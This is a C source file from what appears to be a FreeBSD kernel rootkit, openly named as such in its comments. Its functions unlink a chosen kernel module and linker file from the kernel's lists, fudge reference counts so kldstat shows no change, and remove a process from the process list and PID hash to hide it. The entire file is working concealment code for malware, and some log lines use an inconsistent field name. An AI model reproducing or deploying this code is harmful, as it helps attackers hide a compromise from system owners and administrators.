/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "hide.h"
#include "debug.h"
#include "config.h"

#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/types.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>

extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern struct sx modules_sx;
extern modulelist_t modules;
extern int nextid;

struct module {
	TAILQ_ENTRY(module) link;
	TAILQ_ENTRY(module) flink;
	struct linker_file *file;
	int refs;
	int id;
	char *name;
	modeventhand_t handler;
	void *arg;
	modspecific_t data;
};

void
hide_ko(char *ko_name)
{
	struct module *mod;

	sx_xlock(&modules_sx);

	TAILQ_FOREACH(mod, &modules, link){
		LOGI("Checking Module: %s\n", mod->name);
		if (strcmp(mod->name, ko_name) == 0)
		{
			LOGI("Found %s, Removing from modules list", mod->name);
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);
}

static void
decrement_kernel_image_ref_count(void)
{
	(&linker_files)->tqh_first->refs--;
}

void
hide_kld(char *kld_name)
{
	struct linker_file *lf;

	mtx_lock(&Giant);
	sx_slock(&kld_sx);

	LOGI("Attempting to remove linker file %s\n", kld_name);
	TAILQ_FOREACH(lf, &linker_files, link){
		LOGI("Checking %s\n", lf->filename);
		if(strcmp(lf->filename, kld_name) == 0){
			next_file_id--;
			TAILQ_REMOVE(&linker_files,lf,link);
			LOGI("Found and removing linker file\n");
			break;
		}
	}

	/* Must decrement twice for kldstat to return no changes
	 * when hiding the rootkit. */
	decrement_kernel_image_ref_count();
	decrement_kernel_image_ref_count();

	sx_unlock(&kld_sx);
	mtx_unlock(&Giant);
}

void
hide_process_by_id(pid_t id)
{
	struct proc *p;

	sx_slock(&allproc_lock);

	/* Two options.
	 * 1. Iterate over pidhashtabl.
	 * 2. Iterate over allproc_list.
	 *
	 * Better performance over pidhashtabl. */
	LIST_FOREACH(p, PIDHASH(id), p_list)
	{
		LOGI("[rootkit:hide_process_by_id] Checking PID: %d\n", p->pid);
		if (p->p_pid == id)
		{
			/* A process is either NEW, NORMAL, ZOMBIE
			 * (new means in creation, see proc.h). */
			if (p->p_state == PRS_NEW)
			{
				p = NULL;
				break;
			}

			LOGI("[rootkit:hide_process_by_id] Removing PID: %d\n", p->pid);
			PROC_LOCK(p);

			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);

			PROC_UNLOCK(p);
			break;
		}
	}

	sx_sunlock(&allproc_lock);
}

